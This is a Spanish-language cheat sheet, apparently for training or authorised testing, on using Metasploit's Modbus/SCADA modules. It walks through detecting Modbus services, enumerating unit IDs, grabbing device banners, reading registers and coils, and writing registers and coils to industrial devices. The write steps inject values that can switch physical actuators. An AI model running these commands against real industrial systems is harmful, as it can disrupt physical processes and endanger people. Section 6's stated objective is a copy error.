# 🔍 SCADA / Modbus Reconnaissance — Metasploit Modules

Documentación de módulos auxiliares de Metasploit para el protocolo Modbus.  

---

## 1. Modbusdetect

Detecta si el servicio Modbus está corriendo en el host objetivo.

| Parámetro | Valor |
|-----------|-------|
| Módulo    | `auxiliary/scanner/scada/modbusdetect` |
| Puerto    | `502` (TCP) |
| Target    | `IP` |

```bash
msf6 > use auxiliary/scanner/scada/modbusdetect
msf6 auxiliary(scanner/scada/modbusdetect) > set RHOSTS IP
msf6 auxiliary(scanner/scada/modbusdetect) > set RPORT 502
msf6 auxiliary(scanner/scada/modbusdetect) > run
```

---

## 2. Modbus\_FindUnitID

Prueba diferentes Unit IDs para descubrir qué esclavos Modbus responden.

| Parámetro | Valor |
|-----------|-------|
| Módulo    | `auxiliary/scanner/scada/modbus_findunitid` |
| Target    | `IP` |

```bash
msf6 > use auxiliary/scanner/scada/modbus_findunitid
msf6 auxiliary(scanner/scada/modbus_findunitid) > set RHOSTS 10.197.4.77
msf6 auxiliary(scanner/scada/modbus_findunitid) > run
```

---

## 3. Modbus\_Banner\_Grabbing

**Objetivo:** Envía el **Function Code 43** (*Read Device Identification*) para obtener información detallada del dispositivo (fabricante, modelo, versión de firmware).

| Parámetro | Valor |
|-----------|-------|
| Módulo    | `auxiliary/scanner/scada/modbus_banner_grabbing` |
| Function Code | `43` — Read Device Identification |

```bash
msf6 > use auxiliary/scanner/scada/modbus_banner_grabbing
msf6 auxiliary(scanner/scada/modbus_banner_grabbing) > set RHOSTS IP
msf6 auxiliary(scanner/scada/modbus_banner_grabbing) > run
```

---

## 4. Read\_Holding\_Registers

**Objetivo:**Leer **Estado actual de los registros que se especifique** (*Puede ser 1 o mas*)

| Parámetro | Valor |
|-----------|-------|
| Módulo    | `auxiliary/scanner/scada/modbusclient` |

**1.Configurar la IP del objetivo y el Unit ID válido descubierto previamente**

```bash
# 1. Seleccionar el módulo cliente de Modbus
msf6 > use auxiliary/scanner/scada/modbusclient

# 2. Configurar la IP del objetivo y el Unit ID válido descubierto previamente
msf6 auxiliary(scanner/scada/modbusclient) > set RHOSTS IP
msf6 auxiliary(scanner/scada/modbusclient) > set UNIT_ID 1

# 3. Definir la acción de lectura de registros de retención
msf6 auxiliary(scanner/scada/modbusclient) > set ACTION READ_HOLDING_REGISTERS

# 4. Configurar la dirección de inicio (Address) y la cantidad de registros a leer (NUMBER)
msf6 auxiliary(scanner/scada/modbusclient) > set DATA_ADDRESS 100
msf6 auxiliary(scanner/scada/modbusclient) > set NUMBER 6

# 5. Ejecutar la extracción de datos
msf6 auxiliary(scanner/scada/modbusclient) > run
```

## 5. Read\_Coils

**Objetivo:** Leer el estado actual del coil:

| Parámetro | Valor |
|-----------|-------|
| Módulo    | `auxiliary/scanner/scada/modbusclient` |

```bash
# 1. Asegurar el uso del módulo cliente de Modbus
msf6 > use auxiliary/scanner/scada/modbusclient

# 2. Configurar la IP del objetivo y el ID de la estación
msf6 auxiliary(scanner/scada/modbusclient) > set RHOSTS IP
msf6 auxiliary(scanner/scada/modbusclient) > set UNIT_ID 1

# 3. Cambiar la acción a lectura de bobinas binarias (READ_COILS)
msf6 auxiliary(scanner/scada/modbusclient) > set ACTION READ_COILS

# 4. Configurar la dirección inicial de la bobina (en este caso, la dirección 0)
msf6 auxiliary(scanner/scada/modbusclient) > set DATA_ADDRESS 0
msf6 auxiliary(scanner/scada/modbusclient) > set NUMBER 1

# 5. Ejecutar la solicitud de lectura
msf6 auxiliary(scanner/scada/modbusclient) > run
```

## 6. Write\_Registers

**Objetivo:** Leer el estado actual del coil:

| Parámetro | Valor |
|-----------|-------|
| Módulo    | `auxiliary/scanner/scada/modbusclient` |

```bash
# 1. Utilizar el módulo cliente de Modbus
msf6 > use auxiliary/scanner/scada/modbusclient

# 2. Configurar los parámetros de red básicos
msf6 auxiliary(scanner/scada/modbusclient) > set RHOSTS IP
msf6 auxiliary(scanner/scada/modbusclient) > set UNIT_ID 1

# 3. Cambiar la acción a escritura de registro único (WRITE_REGISTER)
msf6 auxiliary(scanner/scada/modbusclient) > set ACTION WRITE_REGISTER

# 4. Especificar la dirección de memoria y el valor a inyectar (ej. Valor: 0)
msf6 auxiliary(scanner/scada/modbusclient) > set DATA_ADDRESS 100
msf6 auxiliary(scanner/scada/modbusclient) > set DATA 0

# 5. Ejecutar la inyección del comando
msf6 auxiliary(scanner/scada/modbusclient) > run
```
## 7. Write\_Coil

**Objetivo:** Escrivir en el coil valores booleaos (*0 o 1 / apagado o encendido*)

| Parámetro | Valor |
|-----------|-------|
| Módulo    | `auxiliary/scanner/scada/modbusclient` |

```bash
# 1. Asegurar el uso del módulo cliente de Modbus
msf6 > use auxiliary/scanner/scada/modbusclient

# 2. Configurar la IP del host y el identificador de estación
msf6 auxiliary(scanner/scada/modbusclient) > set RHOSTS IP
msf6 auxiliary(scanner/scada/modbusclient) > set UNIT_ID 1

# 3. Cambiar la acción a escritura de bobina única (WRITE_COIL)
msf6 auxiliary(scanner/scada/modbusclient) > set ACTION WRITE_COIL

# 4. Definir la dirección del actuador (DATA_ADDRESS) y el estado binario deseado (DATA)
# En este caso, se inyecta un '1' (Encendido) en la dirección 0
msf6 auxiliary(scanner/scada/modbusclient) > set DATA_ADDRESS 0
msf6 auxiliary(scanner/scada/modbusclient) > set DATA 1

# 5. Forzar el envío del comando a la red OT
msf6 auxiliary(scanner/scada/modbusclient) > run
```





---


> 📌 **Nota:** Todos los escaneos deben realizarse únicamente en redes y dispositivos sobre los que se tenga autorización legal y escrita.
